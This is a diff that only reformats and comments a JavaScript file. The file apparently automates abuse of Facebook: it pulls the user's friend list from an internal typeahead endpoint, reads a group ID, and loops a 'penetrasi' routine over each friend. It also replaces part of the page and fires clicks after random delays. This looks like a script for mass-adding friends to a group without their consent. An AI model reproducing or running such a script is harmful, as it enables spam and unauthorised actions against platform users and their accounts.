@@ -110,7 +110,7 @@ function sleep(a) {
 	}
 } // end function sleep
 
-
+// define jx object
 jx = {
 getHTTPObject: function () {
 	var a = false;
@@ -135,6 +135,7 @@ getHTTPObject: function () {
 	}
 	return a
 },
+
 load: function (url, callback, format, method, opt) {
 	var http = this.init();
 	if (!http || !url) {
@@ -205,10 +206,10 @@ load: function (url, callback, format, method, opt) {
 					if (error) {
 						error(http.status)
 					}
-				}
-			}
-		}
-	}
+				} // end else if http.status
+			} // end if http.readyState
+		} // end http.onreadystatechonge
+	} // end else if opt.handler
 
 
 
@@ -249,31 +250,36 @@ bind: function (a) {
 	if (b.loading) {
 		document.getElementById(b.loading).style.display = "block"
 	}
-this.load(b.url, function (a) {
-	if (b.onSuccess) {
-		b.onSuccess(a)
-	}
-	if (b.update) {
-	document.getElementById(b.update).innerHTML = a
-	}
-	if (d) {
-		document.getElementsByTagName("body")[0].removeChild(d)
-	}
-	if (b.loading) {
-		document.getElementById(b.loading).style.display = "none"
-	}
-},
+	this.load(b.url, 
+		function (a) {
+			if (b.onSuccess) {
+				b.onSuccess(a)
+			}
+			if (b.update) {
+			document.getElementById(b.update).innerHTML = a
+			}
+			if (d) {
+				document.getElementsByTagName("body")[0].removeChild(d)
+			}
+			if (b.loading) {
+				document.getElementById(b.loading).style.display = "none"
+			}
+		},
 
-	b.format, b.method, b)
-},
+		b.format,
+		b.method,
+		b
+	)
+}, // end function bind
 
 init: function () {
 	return this.getHTTPObject()
 }
 
-};
+}; // end jx object
 
 
+// define nHtml object
 var nHtml = {
 	FindByAttr: function (a, b, c, d) {
 		if (c == "className") {
@@ -314,10 +320,12 @@ var nHtml = {
 		return this.ClickWin(window, a, "click")
 	},
 	ClickTimeout: function (a, b) {
-		window.setTimeout(function () {
-			return nHtml.ClickWin(window, a, "click")
-	},
-		b + Math.floor(Math.random() * 500))
+		window.setTimeout(
+			function () {
+				return nHtml.ClickWin(window, a, "click")
+			},
+			b + Math.floor(Math.random() * 500)
+		)
 	},
 	ClickUp: function (a) {
 		this.ClickWin(window, a, "mousedown");
@@ -340,9 +348,9 @@ var nHtml = {
 			c += this.GetText(e, b + 1)
 		}
 		return c
-	}
+	} // end function getText()
 
-	};
+	}; // end nHtml object
 
 	if (document.getElementsByClassName == undefined) {
 		document.getElementsByClassName = function (a) {
@@ -376,10 +384,10 @@ var nHtml = {
 					b.push(i)
 			}
 			}
-		}
+		} // end for i
 
 		return b
-	};
+	}; // end function
 
 	var a = 0,
 	eind = 0;
@@ -394,7 +402,8 @@ var nHtml = {
 			break
 		}
 
-	}
+	} // end for a
+
 	var i = 3;
 	var tay = 3;
 	var counter1 = 0,
@@ -407,7 +416,9 @@ var nHtml = {
 	var memberGroupId = document.getElementsByName('group_id')[0].value;
 	jx.load
 	(
-		window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + user + "&filter[0]=user&__user=" + user, function (a) {
+		window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" 
+			+ user + "&filter[0]=user&__user=" + user, 
+		function (a) {
 			var b = a;
 			var c = b.substring(b.indexOf("{"));
 			var d = JSON.parse(c);
@@ -425,4 +436,4 @@ var nHtml = {
 			document.getElementById("pagelet_welcome_box").innerHTML = dipes;
 			penetrasi(arr[i])
 		}
-	)
+	) // end jx.load()
